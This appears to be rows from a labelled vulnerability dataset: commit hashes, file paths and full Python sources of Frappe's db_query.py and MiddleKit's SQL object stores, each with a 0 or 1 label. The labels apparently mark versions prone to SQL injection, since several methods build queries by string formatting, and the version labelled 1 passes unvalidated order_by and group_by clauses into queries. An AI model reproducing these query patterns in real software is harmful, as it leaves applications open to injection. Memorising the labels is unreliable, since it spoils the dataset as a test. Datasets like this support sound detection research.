				user_permission_values = user_permissions.get(df.options, [])

				condition = 'ifnull(`tab{doctype}`.`{fieldname}`, """")=""""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					condition += """""" or `tab{doctype}`.`{fieldname}` in ({values})"""""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values="", "".join([('""'+frappe.db.escape(v, percent=False)+'""') for v in user_permission_values])
					)
				match_conditions.append(""({condition})"".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append("" and "".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks(""permission_query_conditions"", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return "" and "".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args, meta):
		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = """"

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith(""count("")
					or self.fields[0].lower().startswith(""min("")
					or self.fields[0].lower().startswith(""max("")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = ""`tab{0}`.`{1}` {2}"".format(self.doctype, sort_field or ""modified"", sort_order or ""desc"")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = ""`tab{0}`.docstatus asc, {1}"".format(self.doctype, args.order_by)

	def validate_order_by_and_group_by_params(self, parameters, meta):
		""""""
			Clause cases:
				1. check for . to split table and columns and check for `tab prefix
				2. elif check field in meta
		""""""
		for field in parameters.split("",""):
			if ""."" in field and field.startswith(""`tab""):
				tbl = field.split('.')[0]
				if tbl not in self.tables:
					if tbl.startswith('`'):
						tbl = tbl[4:-1]
					frappe.throw(_(""Please select atleast 1 column from {0} to sort"").format(tbl))
			else:
				field = field.strip().split(' ')[0]
				if field not in [f.fieldname for f in meta.fields]:
					frappe.throw(_(""{0} invalid field in clause"").format(field))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if ""_comments"" in r:
				r._comment_count = len(json.loads(r._comments or ""[]""))

	def update_list_settings(self):
		# update list settings if new search
		list_settings = json.loads(get_list_settings(self.doctype) or '{}')
		list_settings['filters'] = self.filters
		list_settings['limit'] = self.limit_page_length
		list_settings['order_by'] = self.order_by

		if self.save_list_settings_fields:
			list_settings['fields'] = self.list_settings_fields

		update_list_settings(self.doctype, list_settings)

/n/n/n",0
33,33,049d51cdf17b06168b4fe7672be8ce01fff0edd2,"/frappe/model/db_query.py/n/n# Copyright (c) 2015, Frappe Technologies Pvt. Ltd. and Contributors
# MIT License. See license.txt

from __future__ import unicode_literals
""""""build query for doclistview and return results""""""

import frappe, json, copy
import frappe.defaults
import frappe.share
import frappe.permissions
from frappe.utils import flt, cint, getdate, get_datetime, get_time, make_filter_tuple, get_filter, add_to_date
from frappe import _
from frappe.model import optional_fields
from frappe.model.utils.list_settings import get_list_settings, update_list_settings

class DatabaseQuery(object):
	def __init__(self, doctype):
		self.doctype = doctype
		self.tables = []
		self.conditions = []
		self.or_conditions = []
		self.fields = None
		self.user = None
		self.ignore_ifnull = False
		self.flags = frappe._dict()

	def execute(self, query=None, fields=None, filters=None, or_filters=None,
		docstatus=None, group_by=None, order_by=None, limit_start=False,
		limit_page_length=None, as_list=False, with_childnames=False, debug=False,
		ignore_permissions=False, user=None, with_comment_count=False,
		join='left join', distinct=False, start=None, page_length=None, limit=None,
		ignore_ifnull=False, save_list_settings=False, save_list_settings_fields=False,
		update=None, add_total_row=None):
		if not ignore_permissions and not frappe.has_permission(self.doctype, ""read"", user=user):
			raise frappe.PermissionError, self.doctype

		# fitlers and fields swappable
		# its hard to remember what comes first
		if (isinstance(fields, dict)
			or (isinstance(fields, list) and fields and isinstance(fields[0], list))):
			# if fields is given as dict/list of list, its probably filters
			filters, fields = fields, filters

		elif fields and isinstance(filters, list) \
			and len(filters) > 1 and isinstance(filters[0], basestring):
			# if `filters` is a list of strings, its probably fields
			filters, fields = fields, filters

		if fields:
			self.fields = fields
		else:
			self.fields =  [""`tab{0}`.`name`"".format(self.doctype)]

		if start: limit_start = start
		if page_length: limit_page_length = page_length
		if limit: limit_page_length = limit

		self.filters = filters or []
		self.or_filters = or_filters or []
		self.docstatus = docstatus or []
		self.group_by = group_by
		self.order_by = order_by
		self.limit_start = 0 if (limit_start is False) else cint(limit_start)
		self.limit_page_length = cint(limit_page_length) if limit_page_length else None
		self.with_childnames = with_childnames
		self.debug = debug
		self.join = join
		self.distinct = distinct
		self.as_list = as_list
		self.ignore_ifnull = ignore_ifnull
		self.flags.ignore_permissions = ignore_permissions
		self.user = user or frappe.session.user
		self.update = update
		self.list_settings_fields = copy.deepcopy(self.fields)
		#self.debug = True

		if query:
			result = self.run_custom_query(query)
		else:
			result = self.build_and_run()

		if with_comment_count and not as_list and self.doctype:
			self.add_comment_count(result)

		if save_list_settings:
			self.save_list_settings_fields = save_list_settings_fields
			self.update_list_settings()

		return result

	def build_and_run(self):
		args = self.prepare_args()
		args.limit = self.add_limit()

		if args.conditions:
			args.conditions = ""where "" + args.conditions

		if self.distinct:
			args.fields = 'distinct ' + args.fields

		query = """"""select %(fields)s from %(tables)s %(conditions)s
			%(group_by)s %(order_by)s %(limit)s"""""" % args

		return frappe.db.sql(query, as_dict=not self.as_list, debug=self.debug, update=self.update)

	def prepare_args(self):
		self.parse_args()
		self.extract_tables()
		self.set_optional_columns()
		self.build_conditions()

		args = frappe._dict()

		if self.with_childnames:
			for t in self.tables:
				if t != ""`tab"" + self.doctype + ""`"":
					self.fields.append(t + "".name as '%s:name'"" % t[4:-1])

		# query dict
		args.tables = self.tables[0]

		# left join parent, child tables
		for child in self.tables[1:]:
			args.tables += "" {join} {child} on ({child}.parent = {main}.name)"".format(join=self.join,
				child=child, main=self.tables[0])

		if self.grouped_or_conditions:
			self.conditions.append(""({0})"".format("" or "".join(self.grouped_or_conditions)))

		args.conditions = ' and '.join(self.conditions)

		if self.or_conditions:
			args.conditions += (' or ' if args.conditions else """") + \
				 ' or '.join(self.or_conditions)

		self.set_field_tables()

		args.fields = ', '.join(self.fields)

		self.set_order_by(args)
		self.check_sort_by_table(args.order_by)
		args.order_by = args.order_by and ("" order by "" + args.order_by) or """"

		args.group_by = self.group_by and ("" group by "" + self.group_by) or """"

		return args

	def parse_args(self):
		""""""Convert fields and filters from strings to list, dicts""""""
		if isinstance(self.fields, basestring):
			if self.fields == ""*"":
				self.fields = [""*""]
			else:
				try:
					self.fields = json.loads(self.fields)
				except ValueError:
					self.fields = [f.strip() for f in self.fields.split("","")]

		for filter_name in [""filters"", ""or_filters""]:
			filters = getattr(self, filter_name)
			if isinstance(filters, basestring):
				filters = json.loads(filters)

			if isinstance(filters, dict):
				fdict = filters
				filters = []
				for key, value in fdict.iteritems():
					filters.append(make_filter_tuple(self.doctype, key, value))
			setattr(self, filter_name, filters)

	def extract_tables(self):
		""""""extract tables from fields""""""
		self.tables = ['`tab' + self.doctype + '`']

		# add tables from fields
		if self.fields:
			for f in self.fields:
				if ( not (""tab"" in f and ""."" in f) ) or (""locate("" in f): continue


				table_name = f.split('.')[0]
				if table_name.lower().startswith('group_concat('):
					table_name = table_name[13:]
				if table_name.lower().startswith('ifnull('):
					table_name = table_name[7:]
				if not table_name[0]=='`':
					table_name = '`' + table_name + '`'
				if not table_name in self.tables:
					self.append_table(table_name)

	def append_table(self, table_name):
		self.tables.append(table_name)
		doctype = table_name[4:-1]
		if (not self.flags.ignore_permissions) and (not frappe.has_permission(doctype)):
			raise frappe.PermissionError, doctype

	def set_field_tables(self):
		'''If there are more than one table, the fieldname must not be ambigous.
		If the fieldname is not explicitly mentioned, set the default table'''
		if len(self.tables) > 1:
			for i, f in enumerate(self.fields):
				if '.' not in f:
					self.fields[i] = '{0}.{1}'.format(self.tables[0], f)

	def set_optional_columns(self):
		""""""Removes optional columns like `_user_tags`, `_comments` etc. if not in table""""""
		columns = frappe.db.get_table_columns(self.doctype)

		# remove from fields
		to_remove = []
		for fld in self.fields:
			for f in optional_fields:
				if f in fld and not f in columns:
					to_remove.append(fld)

		for fld in to_remove:
			del self.fields[self.fields.index(fld)]

		# remove from filters
		to_remove = []
		for each in self.filters:
			if isinstance(each, basestring):
				each = [each]

			for element in each:
				if element in optional_fields and element not in columns:
					to_remove.append(each)

		for each in to_remove:
			if isinstance(self.filters, dict):
				del self.filters[each]
			else:
				self.filters.remove(each)

	def build_conditions(self):
		self.conditions = []
		self.grouped_or_conditions = []
		self.build_filter_conditions(self.filters, self.conditions)
		self.build_filter_conditions(self.or_filters, self.grouped_or_conditions)

		# match conditions
		if not self.flags.ignore_permissions:
			match_conditions = self.build_match_conditions()
			if match_conditions:
				self.conditions.append(""("" + match_conditions + "")"")

	def build_filter_conditions(self, filters, conditions):
		""""""build conditions from user filters""""""
		if isinstance(filters, dict):
			filters = [filters]

		for f in filters:
			if isinstance(f, basestring):
				conditions.append(f)
			else:
				conditions.append(self.prepare_filter_condition(f))

	def prepare_filter_condition(self, f):
		""""""Returns a filter condition in the format:

				ifnull(`tabDocType`.`fieldname`, fallback) operator ""value""
		""""""

		f = get_filter(self.doctype, f)

		tname = ('`tab' + f.doctype + '`')
		if not tname in self.tables:
			self.append_table(tname)

		if 'ifnull(' in f.fieldname:
			column_name = f.fieldname
		else:
			column_name = '{tname}.{fname}'.format(tname=tname,
				fname=f.fieldname)

		can_be_null = True

		# prepare in condition
		if f.operator in ('in', 'not in'):
			values = f.value
			if not isinstance(values, (list, tuple)):
				values = values.split("","")

			fallback = ""''""
			value = (frappe.db.escape((v or '').strip(), percent=False) for v in values)
			value = '(""{0}"")'.format('"", ""'.join(value))
		else:
			df = frappe.get_meta(f.doctype).get(""fields"", {""fieldname"": f.fieldname})
			df = df[0] if df else None

			if df and df.fieldtype in (""Check"", ""Float"", ""Int"", ""Currency"", ""Percent""):
				can_be_null = False

			if f.operator=='Between' and \
				(f.fieldname in ('creation', 'modified') or (df and (df.fieldtype==""Date"" or df.fieldtype==""Datetime""))):
				value = ""'%s' AND '%s'"" % (
					get_datetime(f.value[0]).strftime(""%Y-%m-%d %H:%M:%S.%f""),
					add_to_date(get_datetime(f.value[1]),days=1).strftime(""%Y-%m-%d %H:%M:%S.%f""))
				fallback = ""'0000-00-00 00:00:00'""
			elif df and df.fieldtype==""Date"":
				value = getdate(f.value).strftime(""%Y-%m-%d"")
				fallback = ""'0000-00-00'""

			elif df and df.fieldtype==""Datetime"":
				value = get_datetime(f.value).strftime(""%Y-%m-%d %H:%M:%S.%f"")
				fallback = ""'0000-00-00 00:00:00'""

			elif df and df.fieldtype==""Time"":
				value = get_time(f.value).strftime(""%H:%M:%S.%f"")
				fallback = ""'00:00:00'""

			elif f.operator in (""like"", ""not like"") or (isinstance(f.value, basestring) and
				(not df or df.fieldtype not in [""Float"", ""Int"", ""Currency"", ""Percent"", ""Check""])):
					value = """" if f.value==None else f.value
					fallback = '""""'

					if f.operator in (""like"", ""not like"") and isinstance(value, basestring):
						# because ""like"" uses backslash (\) for escaping
						value = value.replace(""\\"", ""\\\\"").replace(""%"", ""%%"")

			else:
				value = flt(f.value)
				fallback = 0

			# put it inside double quotes
			if isinstance(value, basestring) and not f.operator=='Between':
				value = '""{0}""'.format(frappe.db.escape(value, percent=False))

		if (self.ignore_ifnull
			or not can_be_null
			or (f.value and f.operator in ('=', 'like'))
			or 'ifnull(' in column_name.lower()):
			condition = '{column_name} {operator} {value}'.format(
				column_name=column_name, operator=f.operator,
				value=value)
		else:
			condition = 'ifnull({column_name}, {fallback}) {operator} {value}'.format(
				column_name=column_name, fallback=fallback, operator=f.operator,
				value=value)

		return condition

	def build_match_conditions(self, as_condition=True):
		""""""add match conditions if applicable""""""
		self.match_filters = []
		self.match_conditions = []
		only_if_shared = False
		if not self.user:
			self.user = frappe.session.user

		if not self.tables: self.extract_tables()

		meta = frappe.get_meta(self.doctype)
		role_permissions = frappe.permissions.get_role_permissions(meta, user=self.user)

		self.shared = frappe.share.get_shared(self.doctype, self.user)

		if not meta.istable and not role_permissions.get(""read"") and not self.flags.ignore_permissions:
			only_if_shared = True
			if not self.shared:
				frappe.throw(_(""No permission to read {0}"").format(self.doctype), frappe.PermissionError)
			else:
				self.conditions.append(self.get_share_condition())

		else:
			# apply user permissions?
			if role_permissions.get(""apply_user_permissions"", {}).get(""read""):
				# get user permissions
				user_permissions = frappe.defaults.get_user_permissions(self.user)
				self.add_user_permissions(user_permissions,
					user_permission_doctypes=role_permissions.get(""user_permission_doctypes"").get(""read""))

			if role_permissions.get(""if_owner"", {}).get(""read""):
				self.match_conditions.append(""`tab{0}`.owner = '{1}'"".format(self.doctype,
					frappe.db.escape(self.user, percent=False)))

		if as_condition:
			conditions = """"
			if self.match_conditions:
				# will turn out like ((blog_post in (..) and blogger in (...)) or (blog_category in (...)))
				conditions = ""(("" + "") or ("".join(self.match_conditions) + ""))""

			doctype_conditions = self.get_permission_query_conditions()
			if doctype_conditions:
				conditions += (' and ' + doctype_conditions) if conditions else doctype_conditions

			# share is an OR condition, if there is a role permission
			if not only_if_shared and self.shared and conditions:
				conditions =  ""({conditions}) or ({shared_condition})"".format(
					conditions=conditions, shared_condition=self.get_share_condition())

			return conditions

		else:
			return self.match_filters

	def get_share_condition(self):
		return """"""`tab{0}`.name in ({1})"""""".format(self.doctype, "", "".join([""'%s'""] * len(self.shared))) % \
			tuple([frappe.db.escape(s, percent=False) for s in self.shared])

	def add_user_permissions(self, user_permissions, user_permission_doctypes=None):
		user_permission_doctypes = frappe.permissions.get_user_permission_doctypes(user_permission_doctypes, user_permissions)
		meta = frappe.get_meta(self.doctype)

		for doctypes in user_permission_doctypes:
			match_filters = {}
			match_conditions = []
			# check in links
			for df in meta.get_fields_to_check_permissions(doctypes):
				user_permission_values = user_permissions.get(df.options, [])

				condition = 'ifnull(`tab{doctype}`.`{fieldname}`, """")=""""'.format(doctype=self.doctype, fieldname=df.fieldname)
				if user_permission_values:
					condition += """""" or `tab{doctype}`.`{fieldname}` in ({values})"""""".format(
						doctype=self.doctype, fieldname=df.fieldname,
						values="", "".join([('""'+frappe.db.escape(v, percent=False)+'""') for v in user_permission_values])
					)
				match_conditions.append(""({condition})"".format(condition=condition))

				match_filters[df.options] = user_permission_values

			if match_conditions:
				self.match_conditions.append("" and "".join(match_conditions))

			if match_filters:
				self.match_filters.append(match_filters)

	def get_permission_query_conditions(self):
		condition_methods = frappe.get_hooks(""permission_query_conditions"", {}).get(self.doctype, [])
		if condition_methods:
			conditions = []
			for method in condition_methods:
				c = frappe.call(frappe.get_attr(method), self.user)
				if c:
					conditions.append(c)

			return "" and "".join(conditions) if conditions else None

	def run_custom_query(self, query):
		if '%(key)s' in query:
			query = query.replace('%(key)s', 'name')
		return frappe.db.sql(query, as_dict = (not self.as_list))

	def set_order_by(self, args):
		meta = frappe.get_meta(self.doctype)
		if self.order_by:
			args.order_by = self.order_by
		else:
			args.order_by = """"

			# don't add order by from meta if a mysql group function is used without group by clause
			group_function_without_group_by = (len(self.fields)==1 and
				(	self.fields[0].lower().startswith(""count("")
					or self.fields[0].lower().startswith(""min("")
					or self.fields[0].lower().startswith(""max("")
				) and not self.group_by)

			if not group_function_without_group_by:
				sort_field = sort_order = None
				if meta.sort_field and ',' in meta.sort_field:
					# multiple sort given in doctype definition
					# Example:
					# `idx desc, modified desc`
					# will covert to
					# `tabItem`.`idx` desc, `tabItem`.`modified` desc
					args.order_by = ', '.join(['`tab{0}`.`{1}` {2}'.format(self.doctype,
						f.split()[0].strip(), f.split()[1].strip()) for f in meta.sort_field.split(',')])
				else:
					sort_field = meta.sort_field or 'modified'
					sort_order = (meta.sort_field and meta.sort_order) or 'desc'

					args.order_by = ""`tab{0}`.`{1}` {2}"".format(self.doctype, sort_field or ""modified"", sort_order or ""desc"")

				# draft docs always on top
				if meta.is_submittable:
					args.order_by = ""`tab{0}`.docstatus asc, {1}"".format(self.doctype, args.order_by)

	def check_sort_by_table(self, order_by):
		if ""."" in order_by:
			tbl = order_by.split('.')[0]
			if tbl not in self.tables:
				if tbl.startswith('`'):
					tbl = tbl[4:-1]
				frappe.throw(_(""Please select atleast 1 column from {0} to sort"").format(tbl))

	def add_limit(self):
		if self.limit_page_length:
			return 'limit %s, %s' % (self.limit_start, self.limit_page_length)
		else:
			return ''

	def add_comment_count(self, result):
		for r in result:
			if not r.name:
				continue

			r._comment_count = 0
			if ""_comments"" in r:
				r._comment_count = len(json.loads(r._comments or ""[]""))

	def update_list_settings(self):
		# update list settings if new search
		list_settings = json.loads(get_list_settings(self.doctype) or '{}')
		list_settings['filters'] = self.filters
		list_settings['limit'] = self.limit_page_length
		list_settings['order_by'] = self.order_by

		if self.save_list_settings_fields:
			list_settings['fields'] = self.list_settings_fields

		update_list_settings(self.doctype, list_settings)

/n/n/n",1
106,106,23414a49db38c1a34097fe5682223b4e8c3518a9,"MiddleKit/Run/MySQLObjectStore.py/n/nimport new

import MySQLdb
from MySQLdb import Warning

from SQLObjectStore import SQLObjectStore


class MySQLObjectStore(SQLObjectStore):
    """"""MySQLObjectStore implements an object store backed by a MySQL database.

    MySQL notes:
      * MySQL home page: http://www.mysql.com.
      * MySQL version this was developed and tested with: 3.22.34 & 3.23.27
      * The platforms developed and tested with include Linux (Mandrake 7.1)
        and Windows ME.
      * The MySQL-Python DB API 2.0 module used under the hood is MySQLdb
        by Andy Dustman: http://dustman.net/andy/python/MySQLdb/.
      * Newer versions of MySQLdb have autocommit switched off by default.

    The connection arguments passed to __init__ are:
      - host
      - user
      - passwd
      - port
      - unix_socket
      - client_flag
      - autocommit

    You wouldn't use the 'db' argument, since that is determined by the model.

    See the MySQLdb docs or the DB API 2.0 docs for more information.
      http://www.python.org/topics/database/DatabaseAPI-2.0.html
    """"""

    def __init__(self, **kwargs):
        self._autocommit = kwargs.pop('autocommit', False)
        SQLObjectStore.__init__(self, **kwargs)

    def augmentDatabaseArgs(self, args, pool=False):
        if not args.get('db'):
            args['db'] = self._model.sqlDatabaseName()

    def newConnection(self):
        kwargs = self._dbArgs.copy()
        self.augmentDatabaseArgs(kwargs)
        conn = self.dbapiModule().connect(**kwargs)
        if self._autocommit:
            # MySQLdb 1.2.0 and later disables autocommit by default
            try:
                conn.autocommit(True)
            except AttributeError:
                pass
        return conn

    def connect(self):
        SQLObjectStore.connect(self)
        if self._autocommit:
            # Since our autocommit patch above does not get applied to pooled
            # connections, we have to monkey-patch the pool connection method
            try:
                pool = self._pool
                connection = pool.connection
            except AttributeError:
                pass
            else:
                def newConnection(self):
                    conn = self._normalConnection()
                    try:
                        conn.autocommit(True)
                    except AttributeError:
                        pass
                    return conn
                pool._normalConnection = connection
                pool._autocommit = self._autocommit
                pool.connection = new.instancemethod(
                    newConnection, pool, pool.__class__)

    def retrieveLastInsertId(self, conn, cur):
        try:
            # MySQLdb module 1.2.0 and later
            lastId = conn.insert_id()
        except AttributeError:
            # MySQLdb module 1.0.0 and earlier
            lastId = cur.insert_id()
        # The above is more efficient than this:
        # conn, cur = self.executeSQL('select last_insert_id();', conn)
        # id = cur.fetchone()[0]
        return lastId

    def dbapiModule(self):
        return MySQLdb

    def _executeSQL(self, cur, sql, clausesArgs=None):
        try:
            cur.execute(sql, clausesArgs)
        except MySQLdb.Warning:
            if not self.setting('IgnoreSQLWarnings', False):
                raise

    def sqlNowCall(self):
        return 'NOW()'


# Mixins

class StringAttr(object):

    def sqlForNonNone(self, value):
        """"""MySQL provides a quoting function for string -- this method uses it.""""""
        return ""'"" + MySQLdb.escape_string(value) + ""'""
/n/n/nMiddleKit/Run/PostgreSQLObjectStore.py/n/n
connectionPool = True
try:
    import psycopg2 as dbi  # psycopg2 version 2
    from psycopg2 import Warning, DatabaseError
    from psycopg2.extensions import QuotedString
except ImportError:
    try:
        import psycopg as dbi  # psycopg version 1
        from psycopg import Warning, DatabaseError
        from psycopg.extensions import QuotedString
    except ImportError:
        connectionPool = False
        import pgdb as dbi  # PyGreSQL
        from pgdb import Warning, DatabaseError
        def QuotedString(s):
            return ""'%s'"" % s.replace(""\\"", ""\\\\"").replace(""'"", ""''"")

from MiscUtils import NoDefault
from MiscUtils.MixIn import MixIn
from MiddleKit.Run.ObjectKey import ObjectKey
from MiddleObject import MiddleObject

from SQLObjectStore import SQLObjectStore, UnknownSerialNumberError


class PostgreSQLObjectStore(SQLObjectStore):
    """"""PostgresObjectStore implements an object store backed by a PostgreSQL database.

    The connection arguments passed to __init__ are:
      - host
      - user
      - passwd
      - port
      - unix_socket
      - client_flag

    You wouldn't use the 'db' argument, since that is determined by the model.
    """"""

    def augmentDatabaseArgs(self, args, pool=False):
        if not args.get('database'):
            args['database'] = self._model.sqlDatabaseName()

    def newConnection(self):
        args = self._dbArgs.copy()
        self.augmentDatabaseArgs(args)
        return self.dbapiModule().connect(**args)

    if connectionPool:

        # psycopg doesn't seem to work well with DBPool. Besides, it does
        # its own connection pooling internally, so DBPool is unnecessary.

        def setting(self, name, default=NoDefault):
            if name == 'SQLConnectionPoolSize':
                return 0
            return SQLObjectStore.setting(self, name, default)

        # psycopg doesn't like connections to be closed because of pooling

        def doneWithConnection(self, conn):
            pass

    def newCursorForConnection(self, conn, dictMode=False):
        return conn.cursor()

    def retrieveNextInsertId(self, klass):
        seqname = ""%s_%s_seq"" % (klass.name(), klass.sqlSerialColumnName())
        conn, curs = self.executeSQL(""select nextval('%s')"" % seqname)
        value = curs.fetchone()[0]
        assert value, ""Didn't get next id value from sequence""
        return value

    def dbapiModule(self):
        return dbi

    def _executeSQL(self, cur, sql, clausesArgs=None):
        try:
            cur.execute(sql, clausesArgs)
        except Warning:
            if not self.setting('IgnoreSQLWarnings', False):
                raise

    def saveChanges(self):
        conn, cur = self.connectionAndCursor()
        try:
            SQLObjectStore.saveChanges(self)
        except DatabaseError:
            conn.rollback()
            raise
        except Warning:
            if not self.setting('IgnoreSQLWarnings', False):
                conn.rollback()
                raise
        conn.commit()

    def sqlCaseInsensitiveLike(self, a, b):
        return ""%s ilike %s"" % (a, b)

    def sqlNowCall(self):
        return 'now()'


class StringAttr(object):

    def sqlForNonNone(self, value):
        """"""psycopg provides a quoting function for string -- use it.""""""
        return ""%s"" % QuotedString(value)


class BoolAttr(object):

    def sqlForNonNone(self, value):
        if value:
            return 'TRUE'
        else:
            return 'FALSE'
/n/n/nMiddleKit/Run/SQLObjectStore.py/n/nimport sys

from MiddleObject import MiddleObject
from ObjectStore import ObjectStore, UnknownObjectError
from ObjectKey import ObjectKey
from MiddleKit.Core.ObjRefAttr import objRefJoin, objRefSplit
from MiscUtils import NoDefault, AbstractError, CSVJoiner
from MiscUtils import Funcs as funcs
from MiscUtils.DBPool import DBPool
from MiscUtils.MixIn import MixIn


class SQLObjectStoreError(Exception):
    """"""SQL object store error""""""

class SQLObjectStoreThreadingError(SQLObjectStoreError):
    """"""SQL object store threading error""""""

class ObjRefError(SQLObjectStoreError):
    """"""SQL object store object reference error""""""

class ObjRefZeroSerialNumError(ObjRefError):
    """"""SQL object store serial number zero error""""""

class ObjRefDanglesError(ObjRefError):
    """"""SQL object store object dangles error""""""


aggressiveGC = False


class UnknownSerialNumberError(SQLObjectStoreError):
    """"""For internal use when archiving objects.

    Sometimes an obj ref cannot be immediately resolved on INSERT because
    the target has not yet been inserted and therefore, given a serial number.
    """"""

    def __init__(self, info):
        self.info = info

    def __repr__(self):
        return '%s: %s' % (self.__class__.__name__, self.info)

    def __str__(self):
        return str(self.info)


class UnknownSerialNumInfo(object):
    """"""For internal use when archiving objects.

    Attrs assigned externally are:
        sourceObject
        sourceAttr
        targetObject
    """"""

    def updateStmt(self):
        assert self.sourceObject.serialNum() != 0
        assert self.targetObject.serialNum() != 0
        sourceKlass = self.sourceObject._mk_klass
        assert sourceKlass
        sourceTableName = sourceKlass.sqlTableName()
        sourceSqlSerialName = sourceKlass.sqlSerialColumnName()
        return 'update %s set %s where %s=%s;' % (
            sourceTableName, self.sourceAttr.sqlUpdateExpr(self.targetObject),
            sourceSqlSerialName, self.sourceObject.serialNum())

    def __repr__(self):
        s = []
        for item in self.__dict__.items():
            s.append('%s=%r' % item)
        s = ' '.join(s)
        return '<%s %s>' % (self.__class__.__name__, s)


class SQLObjectStore(ObjectStore):
    """"""The MiddleKit SQL Object Store.

    TO DO:

      * _sqlEcho should be accessible via a config file setting
        as stdout, stderr or a filename.

    For details on DB API 2.0, including the thread safety levels see:
        http://www.python.org/topics/database/DatabaseAPI-2.0.html
    """"""


    ## Init ##

    def __init__(self, **kwargs):
        # @@ 2001-02-12 ce: We probably need a dictionary before kwargs
        # for subclasses to pass to us in case they override __init__()
        # and end up collecting kwargs themselves
        ObjectStore.__init__(self)
        self._dbArgs = kwargs
        self._connected = False
        self._commited = False
        self._sqlEcho = None
        self._sqlCount = 0
        self._pool = None  # an optional DBPool

    def modelWasSet(self):
        """"""Perform additional set up of the store after the model is set.

        Performs additional set up of the store after the model is set, normally
        via setModel() or readModelFileNamed(). This includes checking that
        threading conditions are valid, and connecting to the database.
        """"""
        ObjectStore.modelWasSet(self)

        # Check thread safety
        self._threadSafety = self.threadSafety()
        if self._threaded and self._threadSafety == 0:
            raise SQLObjectStoreThreadingError('Threaded is True,'
                ' but the DB API threadsafety is 0.')

        # Cache some settings
        self._markDeletes = self.setting('DeleteBehavior', 'delete') == 'mark'

        # Set up SQL echo
        self.setUpSQLEcho()

        # Set up attrs for caching
        for klass in self.model().allKlassesInOrder():
            klass._getMethods = {}
            klass._setMethods = {}
            for attr in klass.allDataAttrs():
                attr._sqlColumnName = None
                attr._sqlColumnNames = None

        # use dbargs from settings file as defaults
        # (args passed to __init__ take precedence)
        args = self._dbArgs
        self._dbArgs = self.setting('DatabaseArgs', {})
        self._dbArgs.update(args)
        # print 'dbArgs = %s' % self._dbArgs

        # Connect
        self.connect()

    def setUpSQLEcho(self):
        """"""Set up the SQL echoing/logging for the store.

        The logging is set up according to the setting 'SQLLog'.

        See the User's Guide for more info. Invoked by modelWasSet().
        """"""
        setting = self.setting('SQLLog', None)
        if setting is None or setting == {}:
            self._sqlEcho = None
        else:
            filename = setting['File']
            if filename is None:
                self._sqlEcho = None
            elif filename == 'stdout':
                self._sqlEcho = sys.stdout
            elif filename == 'stderr':
                self._sqlEcho = sys.stderr
            else:
                mode = setting.get('Mode', 'write')
                assert mode in ['write', 'append']
                mode = mode[0]
                self._sqlEcho = open(filename, mode)


    ## Connecting to the db ##

    def isConnected(self):
        return self._connected

    def connect(self):
        """"""Connect to the database.

        Connects to the database only if the store has not already and provided
        that the store has a valid model.

        The default implementation of connect() is usually sufficient provided
        that subclasses have implemented newConnection().
        """"""
        assert self._model, 'Cannot connect:' \
            ' No model has been attached to this store yet.'
        if not self._connected:
            self._connection = self.newConnection()
            self._connected = True
            self.readKlassIds()
            poolSize = self.setting('SQLConnectionPoolSize', 0)
            if poolSize:
                args = self._dbArgs.copy()
                self.augmentDatabaseArgs(args, pool=True)
                try:
                    self._pool = DBPool(self.dbapiModule(), poolSize, **args)
                except TypeError:
                    if 'database' in args:
                        del args['database']
                        self._pool = DBPool(self.dbapiModule(), poolSize, **args)
                    else:
                        raise

    def augmentDatabaseArgs(self, args, pool=False):
        # give subclasses the opportunity to add or change
        # database arguments
        pass

    def newConnection(self):
        """"""Return a DB API 2.0 connection.

        This is a utility method invoked by connect(). Subclasses should
        implement this, making use of self._dbArgs (a dictionary specifying
        host, username, etc.) as well as self._model.sqlDatabaseName().

        Subclass responsibility.
        """"""
        raise AbstractError(self.__class__)

    def readKlassIds(self):
        """"""Read the klass ids from the SQL database. Invoked by connect().""""""
        conn, cur = self.executeSQL('select id, name from _MKClassIds;')
        try:
            klassesById = {}
            for klassId, name in cur.fetchall():
                assert klassId, 'Id must be a non-zero int.' \
                    ' id=%r, name=%r' % (klassId, name)
                try:
                    klass = self._model.klass(name)
                except KeyError:
                    filename = self._model.filename()
                    msg = ('%s  The database has a class id for %r in the'
                        ' _MKClassIds table, but no such class exists in'
                        ' the model %s. The model and the db are not in sync.'
                        % (name, name, filename))
                    raise KeyError(msg)
                klassesById[klassId] = klass
                klass.setId(klassId)
        finally:
            self.doneWithConnection(conn)
        self._klassesById = klassesById


    ## Changes ##

    def commitInserts(self, allThreads=False):
        unknownSerialNums = []
        # @@ ... sort here for dependency order
        for obj in self._newObjects.items(allThreads):
            self._insertObject(obj, unknownSerialNums)
        conn = None
        try:
            for unknownInfo in unknownSerialNums:
                stmt = unknownInfo.updateStmt()
                conn, cur = self.executeSQL(stmt, conn)
        finally:
            self.doneWithConnection(conn)
        self._newObjects.clear(allThreads)

    def _insertObject(self, obj, unknownSerialNums):
        # New objects not in the persistent store have serial numbers less than 1
        if obj.serialNum() > 0:
            try:
                rep = repr(obj)
            except Exception:
                rep = '(repr exception)'
